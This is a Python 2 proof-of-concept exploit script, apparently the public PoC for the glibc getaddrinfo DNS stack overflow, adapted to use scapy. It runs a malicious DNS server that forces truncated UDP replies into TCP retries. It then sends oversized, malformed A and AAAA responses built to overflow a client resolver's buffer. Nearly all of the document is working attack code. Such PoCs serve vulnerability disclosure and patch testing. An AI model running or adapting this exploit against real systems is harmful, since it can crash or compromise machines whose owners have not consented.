#!/usr/bin/python
# -*- coding: UTF-8 -*-
#
# Copyright 2016 Google Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Authors: 
#   Fermin J. Serna <fjserna@google.com>
#   Gynvael Coldwind <gynvael@google.com>
#   Thomas Garnier <thgarnie@google.com>

# Modifications:        tintinweb@oststrom.com <github.com/tintinweb> @ 02/17/2016
# * switch to scapy

from scapy.all import *
import scapy
import socket
import time
import struct
import threading

IP = '127.0.0.1' # Insert your ip for bind() here...

terminate = False
last_reply = None
reply_now = threading.Event()

#https://stackoverflow.com/questions/15638080/add-length-prefix-to-dns-request-using-tcp-and-scapy
#RFC 1035 
class TCPDNS(DNS):
    name = "TCPDNS"
    fields_desc = [ ShortField("length", 0) ] + DNS.fields_desc 
    
def tcpdn_dissect(data):
    while data:
        t = TCPDNS(data)
        yield TCPDNS(data[:t.length+2])
        data = data[t.length+2:]
        
def udp_thread():
  global terminate

  # Handle UDP requests
  sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock_udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock_udp.bind((IP, 53))

  reply_counter = 0
  counter = -1

  answers = []

  while not terminate:
    data, addr = sock_udp.recvfrom(1024)
    pkt = DNS(data)
    #print repr(pkt)
    #print "<==", '[UDP] Total Data len recv ' + str(len(data))

    print "<== received (%8d) %s"%(len(pkt), repr(pkt)[:500]+"...")
    # Send truncated flag... so it retries over TCP
    p_out = DNS(id=pkt[DNS].id, 
                # ---> flags
                qr=1,           # is a response
                opcode=0,       # is a query
                aa=0,           # not an authority for domain
                tc=1,           # msg is truncated
                rd=1,           # recursion desired
                ra=1,           # recursion available
                z=0,            # reserved
                ad=0,           # answer authenticated
                cd=0,           # non-auth data unacceptable (disabled)
                #rpcode=0,       # reply code No error
                # <--- flags
                qd=pkt[DNS].qd[0],
                #qd=p_question[DNS].qd, 
                #aa = 0,             
                #an=DNSRR(rrname=p_question[DNS].qd.qname,  ttl=10, rdata=redirect_to)
                )/('\x00'*2500)

    answers.append((p_out, addr))

    if len(answers) != 2:
      continue

    counter += 1

    if counter % 4 == 2:
      answers = answers[::-1]

    time.sleep(0.01)
    pkt, peer = answers.pop(0)
    sock_udp.sendto(str(pkt),peer)
    print "==> sent: (%8d) %s"%(len(pkt), repr(pkt)[:500]+"...")
    
    reply_now.wait()
    pkt, peer = answers.pop(0)
    sock_udp.sendto(str(pkt),peer)
    print "==> sent: (%8d) %s"%(len(pkt), repr(pkt)[:500]+"...")

  sock_udp.close()


def tcp_thread():
  global terminate
  counter = -1

  #Open TCP socket
  sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock_tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock_tcp.bind((IP, 53))
  sock_tcp.listen(10)

  while not terminate:
    answers = []
    conn, addr = sock_tcp.accept()
    counter += 1
    print "<== new peer%s"%(repr(addr))
    # Read entire packet
    data = conn.recv(1024)
    pkt_a = None
    pkt_aaaa = None
    
    for pkt in tcpdn_dissect(data):
        print "<== received: (%8d) %s"%(len(pkt), repr(pkt)[:500]+"...")
        if pkt[TCPDNS].qd[0].qtype==28: # AAAA
            pkt_aaaa = pkt
        elif pkt[TCPDNS].qd[0].qtype==1: #A
            pkt_a = pkt
        
    # reply 1 - A
    reply = TCPDNS( #length=
                    id=pkt_a[TCPDNS].id, 
                    # ---> flags
                    qr=1,           # is a response
                    opcode=0,       # is a query
                    aa=0,           # not an authority for domain
                    tc=0,           # msg is truncated
                    rd=1,           # recursion desired
                    ra=1,           # recursion available
                    z=0,            # reserved
                    ad=0,           # answer authenticated
                    cd=0,           # non-auth data unacceptable (disabled)
                    #rpcode=0,       # reply code No error
                    # <--- flags
                    an=DNSRR(rrname=".", 
                             type=25185 ,
                             rclass=29190,
                             ttl=1735356263,
                             rdlen=63,
                             rdata='\x03com\x00\x00\x01\x00\x01\x00$\x84(\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03foo\x03bar\x06google\x03com\x00\x00\x1c\x00\x01\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\r\x00\x04DDDD'
                             ),
                    qd=DNSQR(qname=".", 
                             qtype=3 , # A 
                             qclass=26223),
                    )

    reply.length = len(str(reply))-2
    answers.append(reply)
    
    # reply 2 - AAAA
    reply = TCPDNS(
                id=pkt_aaaa[TCPDNS].id, 
                )/('B'*2300)
    reply.length = len(str(reply))-2
    answers.append(reply)
    
    # boom!
    reply_now.set()
    for pkt in answers:
        time.sleep(0.01)
        conn.sendall(str(pkt))
        print "==> sent: (%8d) %s"%(len(pkt), repr(pkt)[:500]+"...")
    reply_now.clear()


  sock_tcp.shutdown(socket.SHUT_RDWR)
  sock_tcp.close()


if __name__ == "__main__":

 t = threading.Thread(target=udp_thread)
 t.daemon = True
 t.start()
 tcp_thread()
 terminate = True

